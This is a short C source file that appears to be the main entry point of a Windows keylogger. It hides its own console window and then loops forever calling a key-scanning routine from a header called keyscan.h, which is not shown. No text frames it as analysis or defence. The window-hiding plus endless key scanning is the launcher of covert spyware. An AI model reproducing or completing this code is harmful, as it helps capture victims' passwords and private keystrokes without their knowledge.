#include <stdio.h>
#include <stdlib.h>
#include <locale.h>

#include "keyscan.h"

int main(int argc, char **argv){
    setlocale(LC_ALL, "rus");
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    while(TRUE){
        scanCode();
    }
    return 0;
}
